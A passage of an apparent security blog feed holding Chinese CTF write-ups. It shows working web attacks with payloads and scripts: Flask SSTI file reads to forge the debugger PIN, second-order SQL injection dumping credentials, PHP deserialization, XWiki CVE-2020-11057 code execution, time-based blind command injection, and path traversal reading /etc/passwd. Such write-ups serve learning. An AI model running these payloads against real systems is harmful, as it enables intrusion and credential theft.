class="string">"/sys/class/net/eth0/address"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><code>02:42:ac:14:00:0b</code></p><p>转为10进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="number">0x0242ac14000b</span></div><div class="line"><span class="number">2485378088971</span></div></pre></td></tr></table></figure><p>机器id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/etc/machine-id"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>a8eb6cac33e701ae867269db5ce80e7f</p><p>新的machine-id要加上cgroup</p><p>于是读取/proc/self/cgroup并提取里面的id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/proc/self/cgroup"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>拼接</p><p>a8eb6cac33e701ae867269db5ce80e7f52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>脚本来自kingkk师傅 (<a href="https://xz.aliyun.com/t/2553）" target="_blank" rel="external">https://xz.aliyun.com/t/2553）</a></p><p>得到pin码</p><p>742-613-872</p><p>进入debug模式，执行任意python代码</p><p><img src="http://pic.c1imber.top/blog/20200903/vs7HlRFgsaJ1.png?imageslim" alt="mark"></p><p>(需要花时间研究总结一下ssti了，姿势太多)</p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p>下载www.zip进行代码审计</p><p>发现一处二次注入</p><p>在rename.php,在出库时没有对数据库当中的$result[‘filename’]进行转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$info = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$result['filename']&#125;'"</span>);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/uyicsJ7uIJEC.png?imageslim" alt="mark"></p><p>可控输入：upload.php当中的<code>basename(pathinfo($_FILES[&quot;upfile&quot;][&#39;name&#39;]))[&#39;filename&#39;]</code>可以作为二次注入的注入点，这里转义入库，在出库时发生注入</p><p><img src="http://pic.c1imber.top/blog/20200903/XtdHAY1NRtd0.png?imageslim" alt="mark"></p><p>构造<code>filename=&quot;1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200903/kss5lpAg8bqO.png?imageslim" alt="mark"></p><p>接着访问rename，在old filename处传入<code>1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#</code>，触发二次注入</p><p><img src="http://pic.c1imber.top/blog/20200903/Q17Ycr0fdunw.png?imageslim" alt="mark"></p><p>获得数据库username和password为XM和qweqweqwe</p><p>upload.php存在<code>unserialize($_GET[&quot;data&quot;]);</code>，构造payload触发这里的反序列化，获取flag</p><p>payload</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$userinfo=<span class="keyword">array</span>(<span class="string">"XM"</span>,<span class="string">"qweqweqwe"</span>);</div><div class="line">$obj=<span class="keyword">new</span> XCTFGG(<span class="string">"login"</span>,$userinfo);</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div></pre></td></tr></table></figure><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"XCTFGGmethod"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">12</span>:<span class="string">"XCTFGGargs"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>因为这里类的属性是private，当中有不可见字符，需要修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;S:<span class="number">14</span>:<span class="string">"\00XCTFGG\00method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;S:<span class="number">12</span>:<span class="string">"\00XCTFGG\00args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>最终构造上传数据包获取flag</p><pre><code>POST /upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7BS%3A14%3A%22%5C00XCTFGG%5C00method%22%3Bs%3A5%3A%22login%22%3BS%3A12%3A%22%5C00XCTFGG%5C00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D HTTP/1.1Host: 202.182.118.236User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------406950059833807422084179561779Content-Length: 228Origin: http://202.182.118.236Connection: closeReferer: http://202.182.118.236/Upgrade-Insecure-Requests: 1    -----------------------------406950059833807422084179561779Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;getflag.jpg&quot;Content-Type: image/jpeg    111-----------------------------406950059833807422084179561779--</code></pre><p><img src="http://pic.c1imber.top/blog/20200903/dBNtMGL6uSww.png?imageslim" alt="mark"></p><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE-2020-11057</p><p><a href="https://www.anquanke.com/vul/id/2024692" target="_blank" rel="external">https://www.anquanke.com/vul/id/2024692</a></p><p>根据漏洞描述，需要注册账号，然后在编辑个人仪表板的位置可以执行python或groovy代码</p><p>影响版本：</p><p>XWiki Platform 7.2版本至11.10.2版本</p><p>而目标为11.10.1</p><p><a href="http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard" target="_blank" rel="external">http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'ls /'</span>).read()</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/9sU51BthkwiS.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'/readflag'</span>).read()</div></pre></td></tr></table></figure><p>直接执行这个二进制文件不行，一直显示比较数字大小</p><p><img src="http://pic.c1imber.top/blog/20200903/WRrOU06HsHW1.png?imageslim" alt="mark"></p><p>写个交互</p><p>readflag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</div><div class="line">p=Popen(<span class="string">"./readflag"</span>,stdin=PIPE,stdout=PIPE,stderr=PIPE)</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line">res=<span class="string">""</span></div><div class="line">s=p.stdout.readline()</div><div class="line"><span class="keyword">while</span> <span class="string">"Which number is bigger?"</span> <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">print</span> s</div><div class="line">    num0=int(s.split(<span class="string">':'</span>)[<span class="number">0</span>].split(<span class="string">'?'</span>)[<span class="number">1</span>])</div><div class="line">    num1=int(s.split(<span class="string">':'</span>)[<span class="number">1</span>])</div><div class="line">    <span class="keyword">if</span> num0&gt;num1:</div><div class="line">        p.stdin.write(<span class="string">'0\n'</span>)</div><div class="line">        res+=<span class="string">'0'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p.stdin.write(<span class="string">'1\n'</span>)</div><div class="line">        res+=<span class="string">'1'</span></div><div class="line">    s=p.stdout.readline()</div><div class="line"></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到一串二进制字符串</p><p><img src="http://pic.c1imber.top/blog/20200903/Ch5y7143T0vX.png?imageslim" alt="mark"></p><p>转为字符串就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l=[s[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">8</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> l]])</div></pre></td></tr></table></figure><p><code>gactf{XWiki_CVE_without_permission_scripting_execution!!!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EZFLASK&quot;&gt;&lt;a href=&quot;#EZFLASK&quot; class=&quot;headerlink&quot; title=&quot;EZFLASK&quot;&gt;&lt;/a&gt;EZFLASK&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://124.70.206.91:10001/&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020钓鱼城杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/28/2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/28/2020钓鱼城杯writeup/</id>
    <published>2020-08-28T06:46:21.992Z</published>
    <updated>2020-08-28T06:59:34.941Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>php命令执行无回显、不出网、web目录不可写</p><p>通过<code>php -r &quot;sleep(5)&quot;</code>延时可以判断命令执行成功</p><p>获取/flag.txt</p><p><code>cmd=php -r &quot;if(strlen(file_get_contents(&#39;/flag.txt&#39;))==25){sleep(5);}&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200828/n7eLgP9axiwK.png?imageslim" alt="mark"></p><p>时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">l=string.maketrans(<span class="string">""</span>,<span class="string">""</span>)[<span class="number">33</span>:<span class="number">127</span>]</div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsPost = &#123;<span class="string">"cmd"</span>:<span class="string">"php -r \"if(substr((file_get_contents('/flag.txt')),%d,1)=='%s')&#123;sleep(5);&#125;\""</span>%(i,j)&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"no-cache"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Pragma"</span>:<span class="string">"no-cache"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        start=time.time()</div><div class="line">        response = requests.post(<span class="string">"http://119.3.37.185/index.php"</span>, data=paramsPost, headers=headers)</div><div class="line">        end=time.time()</div><div class="line">        <span class="keyword">if</span> end-start &gt;=<span class="number">5</span>:</div><div class="line">            flag+=j</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200828/dIPIfK9dyRyG.png?imageslim" alt="mark"></p><p><code>flag{kijbvstsbsnsj1d9bc8}</code></p><h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h3><p>index.bak泄露key和lock生成算法</p><p><img src="http://pic.c1imber.top/blog/20200828/PxlX4MDEwA8A.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Set-Cookie里给出了lock的值</p><p><img src="http://pic.c1imber.top/blog/20200828/5kUp2V0dPSta.png?imageslim" alt="mark"></p><p>根据lock值爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">str1=<span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span></div><div class="line">str2=<span class="string">'vEUHaY'</span></div><div class="line">str3 = str1[::<span class="number">-1</span>]</div><div class="line">length = len(str2)</div><div class="line">res=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</div><div class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</div><div class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到<code>21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p><code>./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p>得到两个seed</p><p><img src="http://pic.c1imber.top/blog/20200828/Wgh5dVVX24cW.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">mt_srand(<span class="number">718225</span>);</div><div class="line"><span class="comment">//mt_srand(4007230629);</span></div><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> $lock;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> $key;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div></pre></td></tr></table></figure><p>选择正确的locl、key</p><p><code>lock=vEUHaY; key=nRtqGR8mtd9ZOPyI;</code></p><p>需要带上X-Forwarded-For: 127.0.0.1请求，才能获取flag==</p><p><img src="http://pic.c1imber.top/blog/20200828/21dIhUgOR2Kz.png?imageslim" alt="mark"></p><h3 id="zblog（完全是队友们做出来的）"><a href="#zblog（完全是队友们做出来的）" class="headerlink" title="zblog（完全是队友们做出来的）"></a>zblog（完全是队友们做出来的）</h3><p><img src="http://pic.c1imber.top/blog/20200828/Cs7pUhq9chBj.png?imageslim" alt="mark"></p><p>发现title存在任意文件读取</p><p><code>http://122.112.253.135/?title=/../../../../../../../etc/passwd</code></p><p><img src="http://pic.c1imber.top/blog/20200828/2HHUGR8gjkma.png?imageslim" alt="mark"></p><p>尝试读取/flag、/flag.txt均不行。读取/proc/self目录下的文件</p><p>从其他师傅博客里看到的fuzz字典：</p><pre><code>/proc/self/cmdline/proc/self/stat/proc/self/status/proc/self/environ/proc/verison/proc/cmdline/proc/self/cwd/proc/self/fd/0/proc/self/fd/1/proc/self/fd/2/proc/self/fd/3/proc/self/fd/4/proc/self/fd/5/proc/self/fd/6/proc/self/fd/7/proc/self/fd/8/proc/self/fd/9/proc/self/fd/10/proc/self/fd/11/proc/self/fd/12/proc/self/fd/13/proc/self/fd/14/proc/self/fd/15/proc/self/fd/16/proc/self/fd/17/proc/self/fd/18/proc/self/fd/19/proc/self/fd/20/proc/self/fd/21/proc/self/fd/22/proc/self/fd/23/proc/self/fd/24/proc/self/fd/25/proc/self/fd/26/proc/self/fd/27/proc/self/fd/28/proc/self/fd/29/proc/self/fd/30/proc/self/fd/31/proc/self/fd/32/proc/self/fd/33/proc/self/fd/34/proc/self/fd/35/proc/sched_debug/proc/mounts/proc/net/arp/proc/net/route/proc/net/tcp/proc/net/udp/proc/net/fib_trie/proc/version</code></pre><p>在/proc/self/cmdline发现当前运行的web jar包</p><p><img src="http://pic.c1imber.top/blog/20200828/ja16S1KRHrQC.png?imageslim" alt="mark"></p><p>/home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p>但是下载不下来</p><p>后来发现了关键的源码</p><p>/home/ctf/web/src/main/java/Blog.java</p><p><img src="http://pic.c1imber.top/blog/20200828/EpFBv1kxesTb.png?imageslim" alt="mark"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.Template;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</div><div class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.StringWriter;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</div><div class="line">            writer.write(content);</div><div class="line">            writer.close();</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</div><div class="line">        staticFiles.location(<span class="string">"/public"</span>);</div><div class="line"></div><div class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</div><div class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</div><div class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</div><div class="line">        velocityEngine.init();</div><div class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</div><div class="line"></div><div class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</div><div class="line">            request.session(<span class="keyword">true</span>);</div><div class="line">            String title = request.queryParams(<span class="string">"title"</span>);</div><div class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</div><div class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</div><div class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</div><div class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">                template.merge(context, sw);</div><div class="line">                <span class="keyword">return</span> sw;</div><div class="line">            &#125;</div><div class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</div><div class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">            template.merge(context, sw);</div><div class="line">            <span class="keyword">return</span> sw;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>X-Forwarded-For头的位置存在ssti</p><p><img src="http://pic.c1imber.top/blog/20200828/1s9kmIDPRPrN.png?imageslim" alt="mark"></p><p>可以直接rce，直接用solr那个rce payload就可以成功</p><p><img src="http://pic.c1imber.top/blog/20200828/bj7HD4Yma9aM.png?imageslim" alt="mark"></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200828/y95IWbp35WRC.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb&lt;/h3&gt;&lt;p&gt;php命令执行无回显、不出网、web目录不可写&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;php -r &amp;quo
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/24/2020强网杯writeup/</id>
    <published>2020-08-24T08:28:12.524Z</published>
    <updated>2020-08-25T09:41:40.579Z</updated>
    
    <content type="html"><![CDATA[<p>没做出几道题，记录一下吧，周末两天的做题还是有收获的</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p><img src="http://pic.c1imber.top/blog/20200824/7xfowRDckelN.png?imageslim" alt="mark"></p><p>题目直接给了源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line">$username = $_GET[<span class="string">'username'</span>];</div><div class="line">$password = $_GET[<span class="string">'password'</span>];</div><div class="line">$player = <span class="keyword">new</span> player($username, $password);</div><div 